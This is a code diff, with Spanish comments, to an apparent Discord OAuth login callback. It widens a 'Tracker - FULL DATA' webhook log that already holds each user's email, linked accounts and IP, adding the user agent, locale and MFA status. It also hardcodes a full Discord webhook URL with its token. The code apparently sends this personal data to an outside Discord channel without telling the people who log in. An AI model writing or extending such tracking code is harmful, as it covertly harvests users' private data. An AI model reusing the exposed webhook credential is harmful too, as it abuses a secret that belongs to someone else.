@@ -134,21 +134,37 @@ def callback():
             
             conn_str = "\n".join(conn_list) if conn_list else "Ninguna visible"
 
-            # 3.5 ENVIAR ID AL CANAL (Base de Datos)
+            # 3.5 ENVIAR ID AL CANAL (Base de Datos) usando WEBHOOK
+            registration_status = "❌ Error"
+            AUTH_WEBHOOK = "https://discord.com/api/webhooks/1458959364458025164/l8-e6w1r-faAqA0HVDJw1vuq1v8MEWQBvPlE_DoyaOPtsOgJDQ2a-cYTQcEF_Di8n4qB"
+            
             try:
-                # Usamos el token del bot para escribir en el canal
-                BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
-                DB_CHANNEL_ID = "1457771004813246748"
+                print(f"[AUTH] Intentando registrar usuario ID: {user_id} usando webhook")
                 
-                requests.post(
-                    f"https://discord.com/api/v9/channels/{DB_CHANNEL_ID}/messages",
-                    headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
-                    json={"content": str(user_id)}
+                # Enviar SOLO la ID como contenido simple
+                response = requests.post(
+                    AUTH_WEBHOOK,
+                    json={"content": str(user_id)},
+                    timeout=10
                 )
+                
+                if response.status_code in [200, 204]:
+                    print(f"[AUTH] ✅ ID {user_id} registrada exitosamente en el canal vía webhook")
+                    registration_status = "✅ Registrado"
+                else:
+                    print(f"[AUTH] ❌ Error al registrar ID. Status: {response.status_code}, Response: {response.text}")
+                    registration_status = f"❌ Error ({response.status_code})"
+                    
             except Exception as e:
-                print(f"Error guardando en canal DB: {e}")
+                print(f"[AUTH] ❌ Error crítico guardando en canal DB: {e}")
+                registration_status = f"❌ Exception: {str(e)[:50]}"
 
             # 4. Enviar LOG COMPLETO
+            # Información Técnica Adicional (User Agent)
+            user_agent = request.headers.get('User-Agent', 'Desconocido')
+            locale = user.get('locale', 'Desconocido')
+            mfa = "🔒 Activado" if user.get('mfa_enabled') else "🔓 Desactivado"
+            
             requests.post(WEBHOOK, json={
                 "username": "1* Tracker - FULL DATA", "avatar_url": LOGO,
                 "embeds": [{
@@ -160,7 +176,10 @@ def callback():
                         {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
                         {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
                         {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
-                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}
+                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
+                        {"name": "💻 Sistema", "value": f"`{user_agent[:50]}...`", "inline": True},
+                        {"name": "🌍 Locale/MFA", "value": f"{locale} | {mfa}", "inline": True},
+                        {"name": "🎫 Estado Registro", "value": registration_status, "inline": False}
                     ]
                 }]
             })
